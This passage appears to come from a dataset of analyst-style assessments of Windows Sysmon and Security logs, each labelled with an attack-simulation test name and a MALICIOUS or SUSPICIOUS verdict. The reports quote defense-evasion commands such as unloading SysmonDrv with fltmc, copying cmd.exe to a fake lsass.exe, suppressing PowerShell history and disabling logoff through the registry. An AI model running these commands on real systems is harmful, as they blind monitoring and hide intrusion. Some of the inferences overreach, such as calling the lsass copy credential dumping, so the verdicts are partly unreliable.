### Suspicious or Anomalous Behavior:
1. **Execution of System Utility Tools**: 
   - There are multiple entries involving the execution of system utilities such as `fltMC.exe`, `wevtutil.exe`, `findstr.exe`, `whoami.exe`, and `hostname.exe`. These tools are often used for legitimate administrative tasks but can also be leveraged for malicious purposes.
   - Notably, `fltMC.exe` is observed with the command `fltmc.exe unload SysmonDrv`, which attempts to unload the Sysmon driver. This activity is particularly suspicious as it indicates a possible attempt to disable or interfere with security monitoring.

2. **Command Line and Parent/Child Process Relationships**:
   - The presence of PowerShell scripts attempting to check for the `SysmonDrv` driver using `fltMC.exe` and `findstr.exe` indicates potential reconnaissance or evasive actions to determine if sysmon monitoring is active.
   - The launching of `cmd.exe` to execute `fltMC.exe unload SysmonDrv` hints at a scripted or automated attempt to disable Sysmon logging.

3. **High Integrity Level Processes**:
   - The processes run with a high integrity level (`SERVER002\\admin_test`) suggest that an elevated privilege user is executing these tasks.

4. **Repeated Event IDs and Process Execution**:
   - The frequent execution of `wevtutil.exe`, often used for dealing with Windows Event logs, can imply log tampering or data exfiltration attempts.
   - System and security logs show adjustments to system time, which might be indicative of attempts to manipulate timestamps and cover tracks.

### Indicators of Malicious Activity:
- **Sysmon Driver Unloading**: The explicit attempt to check if the Sysmon driver is loaded and subsequently unloading it is a strong indication of malicious intent. Disabling Sysmon implies an effort to obfuscate activities on the system.
- **Unexpected Administrative Actions**: Actions such as log clearing, system time changes, or disabling security tools by a non-typical admin user (not aligned with known schedule/task) suggest a compromise.

### Assessment:
The activities observed in the Sysmon logs, particularly the attempt to unload the Sysmon driver, are highly indicative of malicious activity. The series of related logs suggests the presence of a script or tool aiming to disable system monitoring and potentially alter or clear logs to cover up malicious actions. 

### Resolution: **MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Containment**: Isolate the affected host (Server002) from the network to prevent potential lateral movement or data exfiltration.
2. **Thorough Investigation**: Conduct a comprehensive forensic analysis to determine how the system was compromised and identify any additional affected systems.
3. **Review Security Controls**: Ensure that all key security controls, including system logging (Sysmon), are appropriately enabled and review for further unauthorized modifications.
4. **Patch and Remediate**: Apply necessary security patches and tighten security policies to mitigate similar attacks.
5. **Report Findings**: Inform relevant stakeholders of the breach, including a detailed report of findings, actions taken, and additional recommendations for strengthening defenses."
Service Registry Permissions Weakness,"After thoroughly analyzing the provided Windows event logs, here is a detailed assessment of the situation:

### Summary of Findings:
- **Unusual PowerShell Activity**:
  - There are repeated instances of PowerShell commands that involve accessing registry ACLs (Access Control Lists) under `CurrentControlSet\Services\`. This action was executed using a command line like `powershell.exe & {get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\weakservicename |FL}`.
  - Frequent execution of commands to enumerate permissions on registry keys, particularly on service registry keys, can indicate enumeration activities often performed by attackers looking for weak service configurations for potential privilege escalation.
  
- **Command Execution Context**:
  - The PowerShell commands were executed under the user `SERVER002\admin_test` with high integrity levels, suggesting administrative privileges. This could be of concern if the user is not supposed to have or use such privileges extensively.

- **Frequent Use of `wevtutil.exe`**:
  - `wevtutil.exe` is observed being executed multiple times. This tool is typically used for managing Windows event logs, including clearing logs or exporting them. While certain operations might be routine, excessive use, especially in a short timeframe, can be suspicious as it may indicate attempts to tamper with or erase logs to cover tracks.

- **Scheduled Tasks Operations**:
  - The process `taskhostw.exe`, which is Windows Task Host handling Windows tasks, ran under the `NT AUTHORITY\SYSTEM` account. This is expected under normal circumstances but should be noted if it doesn't align with expected operations.

- **Microsoft Edge Update Activity**:
  - Multiple executions of `MicrosoftEdgeUpdate.exe` and related setup and helper executables (`MicrosoftEdgeUpdateSetup.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`) are recorded. This could relate to routine software updates. However, steps to confirm the legitimacy of the updates are recommended (e.g., verify the hash of the executables).

### Assessment:
- The observed behavior related to the PowerShell activity, especially the registry querying, and manipulation attempts, stands out. The actions might be indicative of discovery or privilege escalation attempts that need further investigation.
- It is critical to confirm whether these actions were legitimate administrative activities or unauthorized actions performed by an attacker.

### Resolution:
- **SUSPICIOUS** - The logs present activity patterns, especially with PowerShell and `wevtutil.exe` usage, that do not definitively confirm malicious activities but are anomalous enough to warrant further investigation.

### Recommendations:
1. **Verify User Actions**: Confirm whether the `admin_test` user or equivalent account was authorized to perform the observed registry and PowerShell activities.
2. **Event Log Verification**: Check if any event logs were tampered with or cleared around the time of this suspicious activity.
3. **Account Activity Review**: Review the account usage of `admin_test`, particularly focusing on privilege usage and determining if administrative tasks were within normal operation boundaries.
4. **Incident Response Protocol**: Engage in a more detailed incident response strategy if the user activity or related processes cannot be accounted for, considering containment and eradication activities if a compromise is confirmed.
5. **Audit and Harden Service Configurations**: Examine service configurations and registry permissions to ensure they conform to security best practices, mitigating potential abuse paths discovered through suspicious enumeration."
Clear Event Logs via VBA,"Upon analyzing the provided Windows event logs, I observed several indicators of suspicious and potentially malicious activity:

1. **PowerShell Command Execution**: 
    - The logs contain an event where a PowerShell script is executed with a command line that includes downloading and executing a script from a remote repository on GitHub (`Invoke-MalDoc.ps1`). The command was executed with the intent to run a script called `ClearLogs` using PowerShell from an obfuscated path. This behavior is commonly associated with adversaries attempting to execute malicious payloads using PowerShell.

2. **Privilege Escalations and Token Privilege Assignments**: 
    - Numerous instances of EventID 4672, which indicate that privileges were assigned to a process. Privileges such as `SeDebugPrivilege` and `SeLoadDriverPrivilege` are sensitive and often leveraged for privilege escalation by attackers.

3. **Anomalous Process Activities**: 
    - The processes `wevtutil.exe` and `conhost.exe` were executed multiple times by the same user `SERVER002\admin_test`. While `conhost.exe` is not inherently suspicious, `wevtutil.exe` might be used for clearing event logs, which aligns with the `ClearLogs` subroutine mentioned in the PowerShell script.

4. **Unusual Access Attempts**:
    - There are multiple `5379` events indicating credential access attempts or operations associated with a token, which are indicative of attempts to obtain credential material from accounts.

5. **Presence of High Integrity Level**:
    - Some processes executed with a ""High Integrity Level,"" particularly the PowerShell execution, suggesting they had elevated privileges. This can provide significant access to an attacker if the machine is compromised.

Considering these observations, the activities captured in the logs align strongly with techniques used by attackers to carry out malicious activity on a network, especially given the PowerShell script execution that ostensibly intended to clear logs and potentially hide tracks.

### Resolution: **MALICIOUS**

Based on the analysis, the logs contain clear indicators of malicious activity. Immediate actions recommended include:
- Isolating the affected host from the network to prevent further action by the potential attacker.
- Performing a forensic analysis on the host to determine further indicators of compromise.
- Reviewing network logs to identify any related activities or communications with known malicious IP addresses or domains.
- Notifying the security team and potentially law enforcement if necessary, depending on company policy and severity.
- Ensuring all responses and activities are appropriately documented for potential legal or regulatory obligations."
Masquerading as Windows LSASS process,"### Analysis of Windows Event Logs

#### Suspicious or Anomalous Behavior:
1. **Repeated Use of `CompatTelRunner.exe`:**
   - The repeated launching of `CompatTelRunner.exe`, a telemetry component, could suggest attempts to misuse it for collecting data than intended. Notable events are seen in both the **Sysmon logs** and **Security logs**, showing the execution of `CompatTelRunner.exe` with varying command-line arguments.
   - Commands such as `copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe` found within the logs can indicate malicious intent, especially when creating executables like `lsass.exe`.

2. **Unusual PowerShell Command:**
   - PowerShell with restricted execution policy is being used with specific commands: 
     ```
     Get-Item -Path ($env:WinDir + '\\inf\\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\\[defaultinstall.nt(amd64|arm|arm64|x86)\\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;
     ```
   - Usage appears to focus on discovering installations which match specific architectures.

3. **Process Execution Manipulation:**
   - The `cmd.exe` process being used to create and execute a fake `lsass.exe` executable is a strong indicator of an attempt to perform credential dumping.
   - Execution of these commands implies misuse of legitimate tools for potentially malicious activities (`Sysmon` logs highlight this behavior).

4. **Creation of Unauthorized Executables:**
   - Creation of `lsass.exe` in the Temp directory that mimics a system process is a red flag (credential theft hint).

5. **Event Log Operations:**
   - Repeated use of `wevtutil.exe` by `admin_test` appears in `Sysmon` logs, suggesting potential log clearing or querying, which is an activity cyber attackers do to cover their tracks.

6. **Privilege Escalation Indicators:**
   - The log entries show the SYSTEM account using `CompatTelRunner.exe` excessively, which signifies privilege misuse.

#### Indicators of Malicious Activity:
- **Attempted Credential Theft:** The behavior surrounding execution of `cmd.exe` to create and execute a faux `lsass.exe` suggests potential credential dumping attempts.
- **Telemetry Misuse:** Potential misuse of telemetry tools (`CompatTelRunner.exe`) for data exfiltration or unauthorized monitoring.
- **PowerShell Execution:** The execution logic used in PowerShell appears targeted and suspicious, aiming to detect specific system architectures.
  
### Assessment and Resolution:
- The patterns of command usage, privilege escalations, and attempts to create executable files indicative of credential theft strongly point to suspicious, if not outright malicious activity.

### Resolution:
- **MALICIOUS:** Logs contain evidence of credential theft attempts, system abuse, and misuse of system telemetry tools. Immediate action required.

### Recommended Actions:
1. **Isolate the Host:**
   - Disconnect the CEO's machine from the network to prevent further spread or exfiltration of data.

2. **Enhance Monitoring:**
   - Implement robust monitoring; review access logs and modify permissions where necessary.

3. **Analyze the Attack Vector:**
   - Perform forensic analysis on the bandoned processes and files created during the suspicious activities.

4. **Patch and Update:**
   - Update all security patches and modify EDR configurations to detect such patterns.

5. **Educate and Inform:**
   - Conduct security awareness training emphasizing PowerShell and event log audit use.

By addressing these areas, the organization can bolster defenses against similar attacks and potential data breaches."
Set Custom AddToHistoryHandler to Avoid History File Logging,"Based on the provided Windows event logs from the CEO's machine, the analysis focuses on identifying any suspicious or potentially malicious activities that might indicate a compromise. Here's the detailed analysis:

### Analysis

1. **Unusual Process Execution**:
   - We see a series of processes being executed by the user `SERVER002\admin_test`. The processes include:
     - `whoami.exe`: Typically used for identifying the current user. Its execution alone is not inherently suspicious but could be suspect in combination with other activities.
     - `conhost.exe`: A legitimate Windows process that often accompanies command-line operations.
     - `wevtutil.exe`: This tool manages event logs, and its use might indicate that someone is trying to view, export, or modify logs. The repeated execution in quick succession could be suspicious.

2. **Unusual PowerShell Activity**:
   - A PowerShell command is executed with `Set-PSReadLineOption -AddToHistoryHandler { return $false }`. This command modifies the PowerShell behavior to not write commands into the history, which may indicate an attempt to hide subsequent command actions. This is suspicious behavior often associated with malicious activities.

3. **High Integrity Level and User Context**:
   - Many processes are launched with high integrity levels under the user `SERVER002\admin_test`, an admin likely indicating high privileges. This can be legitimate if carried out by a system admin, but it could be problematic if these activities are unauthorized.

4. **Edge Update Activities**:
   - The logs show multiple executions related to `MicrosoftEdgeUpdate.exe`. While these generally refer to legitimate update processes, they are quite frequent and bear scrutiny to ensure they align with expected update patterns.

### Assessment

- **Suspicious Behavior**: The repeated execution of `wevtutil.exe` and `PowerShell.exe` with specific commands could be indicative of indicative behaviors. Specifically, the usage of PowerShell to conceal commands from history is a red flag indicating potential malicious intent.
  
- **Potential Threat/Risk**: The system could be subject to unauthorized access or activities attempting to conceal traces using PowerShell and potential event log manipulation with `wevtutil.exe`.

### Resolution

**SUSPICIOUS**

The activities in the logs appear suspicious due to the use of PowerShell to potentially hide activity and the sequence of `wevtutil.exe` executions. While there are no definitive malicious indicators such as malware execution or confirmed data exfiltration, the behavior merits further investigation to determine the legitimacy of these activities.

#### Next Steps

1. **Deep-Dive Investigation**:
   - Review user activity logs for SERVER002\admin_test around the time of these processes to validate legitimate user activity.
   - Investigate the purpose and context of the repeated `wevtutil.exe` usage and determine if there's any associated log tampering.

2. **Security Monitoring**:
   - Increase monitoring on the affected machine to catch any further unauthorized or unusual activities.
   - Review PowerShell activity logs in more detail to ensure there are no other hidden attempts or executed commands.

3. **User Verification**:
   - Validate with the admin user about their activities to confirm whether these are legitimate and align with expected operations.
   - Consider applying additional security controls or policies to monitor and restrict elevated activity if necessary.

By following these steps, you will enhance your ability to determine whether these activities were part of a legitimate administrative task or indicative of a compromise."
Disable Windows LogOff Button,"### Detailed Analysis of Windows Event Logs

#### Overview
The provided Sysmon logs indicate various process creations and terminations on the system named `Server002`. Our primary focus is to determine any signs of suspicious or malicious activity that could warrant further investigation or intervention.

#### Anomalous and Suspicious Activities

1. **Execution of `wevtutil.exe`:**
    - `C:\Windows\System32\wevtutil.exe` is executed multiple times by the user account `SERVER002\admin_test`.
    - Command line indication: `wevtutil epl Microsoft-Windows-Sysmon/Operational C:\Users\ADMIN_~1\AppData\Local\Temp\TempLog.evtx`
    - **Analysis**: The execution of `wevtutil.exe` is used to manage event logs on Windows. While not inherently malicious, frequent exportation of logs may indicate log tampering or exfiltration activities, especially when coupled with the absence of these commands in usual activity logs.

2. **Registry Modifications Using `reg.exe`:**
    - The process `reg.exe` is used via command line to change registry keys related to logoff functionalities:
      - `reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoLogOff /t REG_DWORD /d 1 /f`
    - **Analysis**: Disabling logoff functionalities through registry changes can be a tactic used by attackers to maintain persistence. Such changes warrant further review, especially if not part of planned administrative activity.

3. **Execution of `cmd.exe` with Suspicious Command-Line:**
    - `C:\Windows\System32\cmd.exe` executes with commands altering the registry for explorer policies.
    - **Analysis**: As with the `reg.exe` execution, this suggests potential manipulation aimed at preventing normal user interactions, suggesting an attempt to maintain control or hide activity.

4. **Execution of `whoami.exe`:**
    - There are events for `whoami.exe`, which is used to retrieve user and privilege information.
    - **Analysis**: Frequent or unusual usage of `whoami.exe` can indicate enumeration of user privileges, possibly for privilege escalation.

5. **High Integrity Level Execution:**
    - Many processes are executed with a 'High' integrity level, such as `cmd.exe`, `reg.exe`.
    - **Analysis**: Although normal for some administrative actions, in conjunction with other suspicious activities, it may indicate an attempt to leverage elevated privileges for unauthorized changes.

6. **Use of Service Executables:**
    - Processes such as `svchost.exe`, `WmiPrvSE.exe`, and `MicrosoftEdgeUpdate.exe` are seen running.
    - **Analysis**: Generally benign but noteworthy if seen running alongside other suspicious activities or during an unscheduled time, which could imply misuse.

#### Threat and Risk Assessment

Given the context of multiple suspicious activities such as frequent event log manipulation, registry changes, and querying of user context, there is a significant possibility of malicious intent or activity. These actions suggest potential credential abuse, persistence mechanisms, or data tampering/exfiltration attempts.

#### Guidance and Recommendations

1. **Immediate Action:**
   - Conduct a review of user `SERVER002\admin_test` activities and verify if such actions were authorized or part of routine maintenance.
   - Monitor for further unusual activities from this account.

2. **Security Audit:**
   - Perform a thorough security audit of `Server002`, checking for any unauthorized changes in system settings or user roles.
   - Examine network traffic for possible data exfiltration.

3. **Investigate and Remediate:**
   - Investigate any anomalies in user logins and system access, focusing on unusual patterns.
   - Check for additional indicators of compromise (IoCs) across associated hosts and isolate systems if further compromise is confirmed.

**Resolution: SUSPICIOUS**

The activities recorded in the logs reflect a pattern that could suggest potential unauthorized or malicious behavior. Further investigation is recommended to ascertain the legitimacy and context of these actions."
Extract binary files via VBA,"After carefully reviewing the provided logs, here is a detailed analysis of the events recorded, highlighting any suspicious or anomalous behavior:

### PowerShell Logs:
- **Script Execution**: The PowerShell activity includes running a script that reads from a text file, replaces certain text, and executes a script from an external URL (`https://raw.githubusercontent.com/.../Invoke-MalDoc.ps1`). This behavior is highly suspicious as it suggests potential snapshotting of a macro code and fetching a possibly malicious script from the internet.
- **Invoke-MalDoc**: The use of `Invoke-MalDoc` is indicative of document-based attacks where malicious macro content is executed through a Word document. This suggests an attempt to leverage office macros to execute arbitrary code.
- **Security Protocol**: The script explicitly sets the `[Net.ServicePointManager]::SecurityProtocol` to `Tls12`, which might be an attempt to ensure secure communication while downloading the external script.

### Sysmon Logs:
- **PowerShell Execution**: There's multiple Sysmon event logs indicating the running of `powershell.exe` with high integrity level. The logged command line indicates execution of a potentially malicious PowerShell script.
- **Hostname and Whoami Execution**: These commands are often used within malicious scripts to gain information about the system or the current user context, possibly for reconnaissance purposes.
- **User Account**: All suspicious processes were executed by `SERVER002\\admin_test`, indicating potential abuse of an administrative or privileged account.

### General Observations:
- **Unusual Internet Activity**: The download of a script from a publicly accessible GitHub repository is unusual within typical corporate environments unless explicitly permitted and monitored.
- **Privilege Abuse**: Usage of administrative privilege by `admin_test` to execute potentially malicious scripts might indicate either credential compromise or insider activity.

### Conclusion:
The PowerShell script activity and Sysmon logs strongly indicate potentially malicious activity, especially considering the download and execution of a script from the internet using administrative privileges.

### Resolution:
**MALICIOUS** - The logs are indicative of clear malicious activity due to the suspicious PowerShell command execution, the usage of an external script from an untrusted source, and privilege escalation attempts.

### Recommendations:
- **Immediate Containment**: The machine involved should be isolated from the network to prevent potential spread of any malicious activity.
- **Credential Reset**: Reset credentials for `admin_test` and any other accounts that may have been compromised.
- **Forensic Analysis**: A deeper forensic analysis should be conducted to understand the full scope of the attack and any potential data exfiltration.
- **Review Network Activity**: Examine outbound network traffic to identify any other suspicious activities or connections.
- **Improve Monitoring**: Implement stricter monitoring and anomaly detection for PowerShell activities and administrative account activities."
Bypass UAC using SilentCleanup task,"**Analysis of the Logs:**

After reviewing the logs provided, here are the observations and assessments:

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - The `wevtutil.exe` and `conhost.exe` processes appear multiple times in a sequence close to each other. While `conhost.exe` is a common process used to connect to a command-line interface and is often linked with legitimate activities such as running consoles, its frequent execution alongside `wevtutil.exe` is noteworthy.
   - `wevtutil.exe` is a utility for managing event logs and might be used for legitimate administrative purposes. However, attackers sometimes use it for tampering with logs post-compromise. The absence of command-line arguments makes this intent hard to deduce.

2. **Usage of `cmd.exe` to Execute a Batch File:**
   - A `cmd.exe` process was executed with a command line referencing a batch file located in a temporary directory. This behavior can be suspicious if the batch file is not a part of routine operations and comes from an unexpected location. The referenced path includes a shortened user directory, often seen when dealing with non-standard or temporary filenames.

3. **Execution of `whoami.exe`:**
   - The `whoami.exe` process was executed. This could be a part of regular administrative queries or used by a threat actor to confirm the current user's privileges. Combined with any malicious actions, it often indicates an attacker validating their access level.

4. **Frequent Execution of `MicrosoftEdgeUpdate.exe`:**
   - The Microsoft Edge Update process appears multiple times throughout the logs. This could be part of a normal update cycle. However, there was usage from a temporary directory which might indicate a routine update or a potential misuse.

5. **General Context:**
   - There are consistent executions under the user `SERVER002\admin_test`, which indicates these activities might occur under a logged-in user with administrative privileges, making any malicious intent potentially impactful.
   - The presence of execution at a high integrity level further indicates that these actions were performed with extensive permissions.

**Assessment:**

The presence of batch file execution from a temp directory involving `cmd.exe`, in conjunction with system utilities being used, can suggest suspicious behavior that merits further scrutiny. Without the complete context of these actions (such as discrepancies in the operational schedule or further correlation with network or other logs), it's challenging to conclusively determine malicious intent solely based on these observations.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**

1. **Further Investigation Required:**
   - Retrieve and review the contents of the batch file executed (`data.002.bat`) for any indications of harmful scripts or instructions.
   - Validate the legitimacy of the executed commands, especially those involving `wevtutil.exe`, and determine if any unauthorized modification or deletion of logs occurred.

2. **Contextual Analysis:**
   - Conduct a thorough investigation into the activities of `SERVER002\admin_test`. Check if such activity aligns with legitimate task schedules or administrative scripts.

3. **Validate IP and Network Logs:**
   - Analyze network logs to identify any unusual outbound connections coinciding with the execution times of these processes.

4. **Review System for Potential Backdoors:**
   - Scan the system for any unauthorized software or changes in critical system files that could have been introduced during this activity window.

5. **User and Process Monitoring:**
   - Implement increased monitoring on accounts and processes exhibiting similar behavior for the foreseeable future to uncover any further abnormal activities.

Following this guidance should help to more definitively classify the activity as either benign or malicious."
Invoke HTML Application - Simulate Lateral Movement over UNC Path,"**Detailed Analysis of the Logs:**

1. **PowerShell Events:**
   - The PowerShell logs show several instances of `powershell.exe` being executed with the following command: `{Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\system32\mshta.exe}`. 
   - This particular command is leveraging `mshta.exe`, a legitimate tool used to execute Microsoft HTML Application (HTA) files, which is often abused by attackers to execute code in a more obscure and potentially malicious manner.
   - The use of `Invoke-ATHHTMLApplication` and piping it through `mshta.exe` seems suspicious because it is not a common administrative task or benign activity.

2. **Sysmon Events:**
   - The Sysmon logs indicate the execution of multiple system utilities such as `conhost.exe`, `wevtutil.exe`, and `whoami.exe` by the user `SERVER002\admin_test`.
   - Notably, `whoami.exe` and `hostname.exe` are standard utilities that may be run by scripts or batch processes. Their presence alone doesn’t necessarily indicate malicious intent.
   - However, repeated entries of `wevtutil.exe` suggest an attempt to query or possibly export logs (`""C:\Windows\system32\wevtutil.exe"" epl Microsoft-Windows-Sysmon/Operational C:\Users\ADMIN_~1\AppData\Local\Temp\TempLog.evtx`). This action might be an attempt to cover tracks, which is suspicious behavior.

**Assessment of the Situation:**

- The activity outlined in the logs is suspicious due to the Powershell command execution that utilizes `mshta.exe` and seems aimed at performing unclear operations, potentially using the HTA mechanism for payload delivery.
- The repeated use of `wevtutil.exe` to interact with event logs reinforces the possibility of log tampering or exfiltration attempts, often used in malicious operations to hide evidence or gain insights into system monitoring mechanisms.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Actions:**
   - Isolate `Server002` from the network to prevent any potential lateral movement within the organization.
   - Conduct a detailed examination of scripts or payloads associated with `Invoke-ATHHTMLApplication` to understand its origin and intent.
   - Review other event logs not exported yet for any additional insights or corroborating malicious activities.

2. **Further Investigation:**
   - Gather more contextual information about recent changes or updates related to PowerShell scripts and user activities on the host.
   - Verify the integrity and authenticity of other executables and configurations on the system that may have been altered by malicious actors.
   - Conduct threat intelligence research to identify any known patterns or signatures associated with the observed command patterns.

3. **Protective Measures:**
   - Increase the logging verbosity for PowerShell and Sysmon to capture more detailed command executions and file actions.
   - Implement stricter access controls around PowerShell script execution, specifically around critical users and systems like the CEO’s machine.
   - Communicate findings and potential risks with the appropriate business and security stakeholders for awareness and alignment on response strategies. 

The current assessment is SUSPICIOUS, requiring further investigation to determine if the observed actions constitute a breach or if it is benign with legitimate intent not apparent from the logs alone."
Execution of HTA and VBS Files using Rundll32 and URL.dll,"Based on the Windows event logs provided, a detailed analysis leads to the following observations:

1. **Security Log**:
   - **Event ID 4616**: This event signifies a change in system time, which can be indicative of attempts to evade detection by altering timestamps related to malicious activities. However, both events logged at `16:24:19` show minimal difference between the `PreviousTime` and `NewTime`, suggesting a benign system process might have triggered it.

2. **System Log**:
   - **Event ID 19**: A successful update of the Security Intelligence Update for Microsoft Defender, indicating ongoing maintenance and security updates, which is standard behavior.
   - **Event ID 24 and 1**: Logs associated with system changes generally related to time adjustments made by **svchost.exe**, which is a common process and likely associated with legitimate services.

3. **Sysmon Log**:
   - Multiple entries show execution of legitimate Windows utilities like `svchost.exe`, `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe` by the user `SERVER002\admin_test`. Non-anomalous usage here is likely as they are standard utilities and part of regular Windows operations.
   - **Command Execution via cmd.exe**: Entry with `cmd.exe` using `rundll32.exe` to open a URL and execute a VBS script located in a temporary user folder. This is suspicious given it's a common technique used for executing malicious scripts (initial access, persistence, or privilege escalation).

4. **Application Log**:
   - No evidence of abnormal behavior; logs primarily show `Windows Defender` activity, indicating it is on and functioning.

**Assessment and Resolution**:
- The consistent use of critical Windows utilities alongside the suspicious `cmd.exe` usage raises red flags. Specifically, the usage of `rundll32.exe` with scripts in temporary locations has a strong potential for misuse in malicious activities such as malware delivery or execution.
  
- **Resolution**: **MALICIOUS** - The observed behavior contains signs characteristic of malicious activities, particularly the command-line usage indicative of potential script-based attacks. Immediate action should be taken, such as isolating the machine, performing a full malware scan, and analyzing any scripts found in the temporary directory to identify potential threats. Further investigation into the user's actions is warranted to determine any broader compromise."
LOLBAS CustomShellHost to Spawn Process,"### Detailed Analysis:

Upon reviewing the provided Windows event logs, several indicators suggest potentially malicious or at least suspicious activity that warrants further investigation.

#### 1. **Process Creation and Execution Patterns:**
- Multiple `wevtutil.exe` executions occurred in quick succession, initiated by the user `SERVER002\\admin_test`. This utility is a legitimate Windows tool used for managing Windows Event Logs, but its use, especially in rapid succession without context, can often be associated with attacker activity to query or clear event logs.
  
- The repeated invocation of `conhost.exe` is typically benign, as it is spawned by console applications. However, the frequency and pattern under the same user might deserve attention when analyzed with associated actions.

#### 2. **Suspicious PowerShell Execution:**
- The logs indicate a PowerShell script execution with the command `'powershell.exe' & {if (-not (Test-Path C:\test)) { New-Item -Path C:\test -ItemType Directory } else { Write-Host ""Directory C:\test already exists."" } Copy-Item -Path ""C:\windows\system32\customshellhost.exe"" -Destination ""C:\test\customshellhost.exe"" -Force Copy-Item -Path ""C:\windows\system32\calc.exe"" -Destination ""C:\test\explorer.exe"" -Force C:\test\customshellhost.exe}`. This command is highly suspicious for several reasons:
  - **Directory Creation & File Copying**: It attempts to create a directory if it doesn't exist and copies potentially critical executable files (`customshellhost.exe` and `calc.exe`) to a different folder, renaming `calc.exe` to `explorer.exe` in the process.
  - **Execution of untrusted binaries**: The script ultimately attempts to run `customshellhost.exe`. If this executable is not recognized as legitimate, this behavior is aligned with malicious operations such as persistence mechanisms or evasion techniques.

#### 3. **Time Manipulation:**
- Kernel-General and Security logs both indicate that there have been minor changes to the system time. This could potentially be normal or related to NTP synchronization but should be corroborated whether the timescales were legitimate.

### Conclusion and Resolution:

Given the evidence of repeated suspicious process executions and the highly suspicious PowerShell script indicative of potentially unauthorized file operations or efforts to mask activity (e.g. renaming executables), the logs reflect activity that cannot be conclusively classified as benign. While this evidence alone does not confirm a breach or malicious intent, it raises significant concerns and mirrors tactics often employed by skilled attackers.

**Resolution: SUSPICIOUS**

### Guidance on Further Action:
1. **Containment and Monitoring:**
   - Immediately monitor the user account `SERVER002\\admin_test` for any further unusual or unauthorized actions.
   - Contain the system from sensitive segments of the network to prevent potential lateral movement.

2. **Detailed Investigation:**
   - Conduct a thorough review of `customshellhost.exe` and `explorer.exe` files copied by the script for any malware signatures or anomalies.
   - Cross-reference these logs with network logs to examine unauthorized exfiltration or command and control communications.
   - Reassess systems logs for any other context that might explain the use of `wevtutil.exe`.

3. **Incident Response:**
   - If further evidence of a compromise is found, escalate the incident to a full security investigation in alignment with organizational response protocols.
   - Reset passwords and review access permissions if there's a chance that administrative accounts have been compromised.

4. **Forensic Analysis:**
   - Capture a forensic snapshot of the affected systems for deeper offline analysis.
   - Look for IOCs (Indicators of Compromise) in antivirus or EDR databases.

The above steps should form part of a coordinated effort to safeguard the affected system and ascertain the full scope of the suspicious behavior observed."
InfDefaultInstall.exe .inf Execution,"Upon reviewing the provided Windows event logs for the CEO's machine on Server002, I conducted an analysis focused on identifying any indicators of suspicious or malicious activity. Here are the key observations and findings:

1. **Application Log:**
   - The logs record routine operations related to Microsoft Edge Update.
   - There are multiple entries indicating that the ""edgeupdate"" service has been stopped, but without further context, such termination of a service is not inherently suspicious.

2. **Sysmon Log:**
   - Multiple entries involving ""Microsoft Edge Update"" processes, including setup, update, and service-related executions. These entries appear normal and indicate routine update operations.
   - An interesting set of entries correlates the execution of `cmd.exe` with unusual activity, particularly the use of `InfDefaultInstall.exe`, pointing to a script or command execution from a temporary directory, which could be a possible indicator of a software installation or script execution that could be benign but needs further scrutiny.
   - The invocation of `hostname.exe` and `whoami.exe` are standard administrative commands used for gathering system information. However, their execution context should be further evaluated to rule out possible reconnaissance activity by an unauthorized user.
   - The presence of `powershell.exe` invocation by user `SERVER002\admin_test` is noteworthy. PowerShell is commonly used by attackers for malicious purposes, yet there is no specific information in the log entries about the command-line arguments or intentions, necessitating further review to determine whether it’s benign or part of regular administrative activities.
   - Logs show multiple executions of `wevtutil.exe`, which is a utility to manage event logs. Multiple rapid executions could indicate an attempt to clear logs or manipulate them, which can be suspicious.

3. **Security Log:**
   - The events show successful logons by the SYSTEM account with high privileges.
   - The presence of security audit logs indicating the acquisition of several sensitive privileges by SYSTEM suggests legitimate system processes rather than abnormal activity, but it should be evaluated in the broader context of other logs.

4. **Assessed Risk:**
   - The patterns observed in the logs, such as executing system information commands (`hostname.exe`, `whoami.exe`), administrative scripts (`InfDefaultInstall.exe`), and the brief use of PowerShell, suggest possible system configuration changes or maintenance tasks. However, without explicit command lines and referenced scripts or context, there's a chance these entries might not be routine.
   - The use of `conhost.exe` and `cmd.exe` by `SERVER002\admin_test` needs close examination as they could indicate an interactive session that might not align with expected operations. 
   - The high volume of Microsoft Edge Update processes appears consistent with software update processes and generally should not be alarming unless found altered from official sources.

**Final Assessment and Resolution:**

Given all evidence and considering potential areas of concern for further evaluation, the overall activity within the logs falls under the ""SUSPICIOUS"" category. While there's no definitive evidence of malicious activity, the use of scripts and utilities requires further investigation to rule out any tampering or unauthorized use. Steps to follow would involve:
- Verifying the legitimacy of the scripts and commands executed, especially those in temporary directories.
- Confirming recent system changes with the involved admin (`SERVER002\admin_test`) or IT department.
- Reviewing additional context or logs (e.g., PowerShell script block logging, further security audits) where feasible to ensure no compromise has occurred.

Based on the current information and until verified as otherwise, monitoring and further detailed exploration are warranted to ensure the security of the CEO's machine."
Snake Malware Registry Blob,"### Analysis of Windows Event Logs:

Upon reviewing the provided logs, several key points stand out:

#### PowerShell Activity:
- A series of PowerShell events indicate a script is being executed, which involves accessing the registry and modifying it by adding random bytes as a binary value under a key: `HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds`.
- Such registry modifications can be indicative of attempts to alter file handling or execution settings, which is suspicious behavior.

#### Process Execution and Command Activity:
- Sysmon logs show the execution of processes like `whoami.exe`, `wevtutil.exe`, and `powershell.exe` from a user context with high integrity level. While these are legitimate Windows processes, their usage in specific contexts can be suspicious.
- The `whoami.exe` may be abused to check current permissions, often used in reconnaissance during an attack.
- The frequent execution of `wevtutil.exe` could indicate potential tampering or querying of event logs, which might suggest someone is attempting to cover their tracks or gather information about Windows Event Logs. 
- The PowerShell script being executed stands out due to its operations on binary registry values, with no clear benign context.

#### Time Synchronization:
- Security logs indicate a legitimate time synchronization process (`EventID 4616`) related to svchost.exe, likely benign and necessary for time service regulation.

